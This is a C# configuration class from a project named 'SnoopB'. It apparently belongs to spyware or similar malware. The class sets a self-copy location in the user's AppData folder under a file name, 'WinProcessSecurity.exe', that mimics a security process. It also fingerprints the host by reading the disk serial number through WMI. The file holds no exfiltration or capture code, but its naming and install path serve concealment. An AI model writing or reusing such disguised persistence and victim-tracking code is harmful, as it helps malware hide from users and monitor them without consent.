using System;
using System.IO;
using System.Windows.Forms;
using System.Management;

namespace SnoopB.Configuration
{
    public class Configurator
    {
        private Configurator()
        {
        
        }

        #region [ Singleton ]

        private static Configurator _instance = new Configurator();

        public static Configurator Instance
        {
            get
            {
                return _instance; 
            }
        }

        #endregion

        private readonly string _copyMainPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private string _mainFolderName = "WinProcessSecurity";
        private string _fileNameWithoutExtension = "WinProcessSecurity";
        private readonly string _fileNameWithExtension = "WinProcessSecurity.exe";
        private readonly string _currentExecutionPath = Application.StartupPath;
        private string _uniquedId = null;

        public string MainDirectory
        {
            get { return Path.Combine(_copyMainPath, _mainFolderName); }
        }

        public string FullFileNamePath
        {
            get { return Path.Combine(MainDirectory, _fileNameWithExtension); }
        }

        public string FileNameWithoutExtension
        {
            get { return _fileNameWithoutExtension; }
        }

        public string FileNameWithExtension
        {
            get { return _fileNameWithExtension; }
        }

        public string CurrentExecutionPath
        {
            get { return _currentExecutionPath; }
        }

        public string UniqueId
        {
            get
            {
                if (_uniquedId == null)
                    _uniquedId = GetUniqueId();

                return _uniquedId;
            }
        }

        private string GetUniqueId()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMedia");
            ManagementObjectCollection managementObjects = searcher.Get();

            foreach (ManagementObject obj in managementObjects)
            {
                if (obj["SerialNumber"] != null)
                    return obj["SerialNumber"].ToString();
            }

            return string.Empty;

        }
    }
}
